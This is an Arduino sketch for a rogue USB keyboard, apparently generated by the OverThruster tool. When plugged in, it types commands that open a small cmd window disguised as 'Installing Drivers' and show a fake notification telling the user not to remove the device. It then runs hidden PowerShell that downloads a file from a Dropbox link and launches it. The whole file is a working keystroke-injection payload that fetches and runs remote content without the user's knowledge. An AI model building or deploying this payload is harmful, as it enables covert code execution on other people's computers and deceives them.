//This Arduino Sketch was generated with the OverThruster tool, located here: https://github.com/RedLectroid/OverThruster

#include <HID-Project.h>
void setup() {
  Keyboard.begin();
  hurryUp();
  killCaps();
  bypassUAC();
  bubblePopup();
  //THIS DELAY IS IMPORTANT, AND MAY NEED TO BE MODIFIED FOR YOUR TARGET
  delay(1000);
  downBinary();
  Keyboard.end();
}
void pressEnter(){
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
}
void hurryUp(){
  boolean areWeThereYet = capsCheck();
  while (areWeThereYet == capsCheck()){
    hitCaps();
  }
  hitCaps();
}

boolean capsCheck(){
  if (BootKeyboard.getLeds() & LED_CAPS_LOCK){
    return true;
  }
  else{
    return false;
  }
}

void hitCaps(){
  Keyboard.press(KEY_CAPS_LOCK);
  delay(100);
  Keyboard.release(KEY_CAPS_LOCK);
}

void killCaps(){
  if (capsCheck())
  {
      hitCaps();
  }
}

void bypassUAC(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(100);
  Keyboard.println("cmd.exe /T:01 /K mode CON: COLS=15 LINES=1 && title Installing Drivers");
  delay(100);
  pressEnter();
  delay(500);
}
void bubblePopup(){
  Keyboard.println("wlrmdr.exe -s 60000 -f 1 -t \"Installing Drivers\" -m \"Please do not remove the device\"");
  delay(100);
  pressEnter();
  delay(750);
}
void downBinary(){
  Keyboard.println("cd\\users\\%USERNAME%");
  delay(100);
  pressEnter();
  Keyboard.println("powershell -w hidden \"$source = 'https://www.dropbox.com/s/7jjlrd1m23gpt4g/Test.docx?dl=0'; $destination = 'Test.docx?dl=0'; Invoke-WebRequest $source -OutFile $destination;start-process 'Test.docx?dl=0';exit;\"");
  delay(100);
  pressEnter();
  Keyboard.println("exit");
  delay(100);
  pressEnter();
}
void loop()
{
}
